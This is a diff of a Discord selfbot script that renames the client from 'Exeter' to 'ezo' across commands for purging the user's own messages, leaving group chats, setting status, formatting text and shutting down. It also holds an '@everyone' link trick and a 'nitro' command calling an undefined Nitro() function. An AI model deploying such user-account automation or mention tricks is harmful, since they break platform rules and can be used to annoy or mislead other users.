@@ -3106,7 +3090,7 @@ async def kiss(ctx, user: discord.Member):
         await ctx.send(embed=em)
 
 
-@Exeter.command()
+@ezo.command()
 async def uptime(ctx):
     await ctx.message.delete()
     now = datetime.datetime.utcnow()
@@ -3122,18 +3106,18 @@ async def uptime(ctx):
     await ctx.send(uptime_stamp)
 
 
-@Exeter.command()
+@ezo.command()
 async def purge(ctx, amount: int = None):
     await ctx.message.delete()
     if amount is None:
-        async for message in ctx.message.channel.history(limit=999).filter(lambda m: m.author == Exeter.user).map(
+        async for message in ctx.message.channel.history(limit=999).filter(lambda m: m.author == ezo.user).map(
                 lambda m: m):
             try:
                 await message.delete()
             except:
                 pass
     else:
-        async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == Exeter.user).map(
+        async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == ezo.user).map(
                 lambda m: m):
             try:
                 await message.delete()
@@ -3141,162 +3125,162 @@ async def purge(ctx, amount: int = None):
                 pass
 
 
-@Exeter.command(name='group-leaver',
+@ezo.command(name='group-leaver',
                 aliase=['leaveallgroups', 'leavegroup', 'leavegroups', "groupleave", "groupleaver"])
 async def _group_leaver(ctx):
     await ctx.message.delete()
-    for channel in Exeter.private_channels:
+    for channel in ezo.private_channels:
         if isinstance(channel, discord.GroupChannel):
             await channel.leave()
 
 
-@Exeter.command(aliases=["streaming"])
+@ezo.command(aliases=["streaming"])
 async def stream(ctx, *, message):
     await ctx.message.delete()
     stream = discord.Streaming(
         name=message,
         url=stream_url,
     )
-    await Exeter.change_presence(activity=stream)
+    await ezo.change_presence(activity=stream)
 
 
-@Exeter.command(alises=["game"])
+@ezo.command(alises=["game"])
 async def playing(ctx, *, message):
     await ctx.message.delete()
     game = discord.Game(
         name=message
     )
-    await Exeter.change_presence(activity=game)
+    await ezo.change_presence(activity=game)
 
 
-@Exeter.command(aliases=["listen"])
+@ezo.command(aliases=["listen"])
 async def listening(ctx, *, message):
     await ctx.message.delete()
-    await Exeter.change_presence(
+    await ezo.change_presence(
         activity=discord.Activity(
             type=discord.ActivityType.listening,
             name=message,
         ))
 
 
-@Exeter.command(aliases=["watch"])
+@ezo.command(aliases=["watch"])
 async def watching(ctx, *, message):
     await ctx.message.delete()
-    await Exeter.change_presence(
+    await ezo.change_presence(
         activity=discord.Activity(
             type=discord.ActivityType.watching,
             name=message
         ))
 
 
-@Exeter.command(aliases=["stopstreaming", "stopstatus", "stoplistening", "stopplaying", "stopwatching"])
+@ezo.command(aliases=["stopstreaming", "stopstatus", "stoplistening", "stopplaying", "stopwatching"])
 async def stopactivity(ctx):
     await ctx.message.delete()
-    await Exeter.change_presence(activity=None, status=discord.Status.dnd)
+    await ezo.change_presence(activity=None, status=discord.Status.dnd)
 
 
-@Exeter.command()
+@ezo.command()
 async def reverse(ctx, *, message):
     await ctx.message.delete()
     message = message[::-1]
     await ctx.send(message)
 
 
-@Exeter.command()
+@ezo.command()
 async def shrug(ctx):
     await ctx.message.delete()
     shrug = r'¯\_(ツ)_/¯'
     await ctx.send(shrug)
 
 
-@Exeter.command()
+@ezo.command()
 async def lenny(ctx):
     await ctx.message.delete()
     lenny = '( ͡° ͜ʖ ͡°)'
     await ctx.send(lenny)
 
 
-@Exeter.command(aliases=["fliptable"])
+@ezo.command(aliases=["fliptable"])
 async def tableflip(ctx):
     await ctx.message.delete()
     tableflip = '(╯°□°）╯︵ ┻━┻'
     await ctx.send(tableflip)
 
 
-@Exeter.command()
+@ezo.command()
 async def unflip(ctx):
     await ctx.message.delete()
     unflip = '┬─┬ ノ( ゜-゜ノ)'
     await ctx.send(unflip)
 
 
-@Exeter.command()
+@ezo.command()
 async def bold(ctx, *, message):
     await ctx.message.delete()
     await ctx.send('**' + message + '**')
 
 
-@Exeter.command()
+@ezo.command()
 async def censor(ctx, *, message):
     await ctx.message.delete()
     await ctx.send('||' + message + '||')
 
 
-@Exeter.command()
+@ezo.command()
 async def underline(ctx, *, message):
     await ctx.message.delete()
     await ctx.send('__' + message + '__')
 
 
-@Exeter.command()
+@ezo.command()
 async def italicize(ctx, *, message):
     await ctx.message.delete()
     await ctx.send('*' + message + '*')
 
 
-@Exeter.command()
+@ezo.command()
 async def strike(ctx, *, message):
     await ctx.message.delete()
     await ctx.send('~~' + message + '~~')
 
 
-@Exeter.command()
+@ezo.command()
 async def quote(ctx, *, message):
     await ctx.message.delete()
     await ctx.send('> ' + message)
 
 
-@Exeter.command()
+@ezo.command()
 async def code(ctx, *, message):
     await ctx.message.delete()
     await ctx.send('`' + message + "`")
 
 
-@Exeter.command(name='rolecolor')
+@ezo.command(name='rolecolor')
 async def _role_hexcode(ctx, *, role: discord.Role):
     await ctx.message.delete()
     await ctx.send(f"{role.name} : {role.color}")
 
 
-@Exeter.command()
+@ezo.command()
 async def empty(ctx):
     await ctx.message.delete()
     await ctx.send(chr(173))
 
 
-@Exeter.command()
+@ezo.command()
 async def everyone(ctx):
     await ctx.message.delete()
     await ctx.send('https://@everyone@google.com')
 
 
-@Exeter.command(aliases=["logout"])
+@ezo.command(aliases=["logout"])
 async def shutdown(ctx):
     await ctx.message.delete()
-    await Exeter.logout()
+    await ezo.logout()
 
 
-@Exeter.command(aliases=["nitrogen"])
+@ezo.command(aliases=["nitrogen"])
 async def nitro(ctx):
     await ctx.message.delete()
     await ctx.send(Nitro())
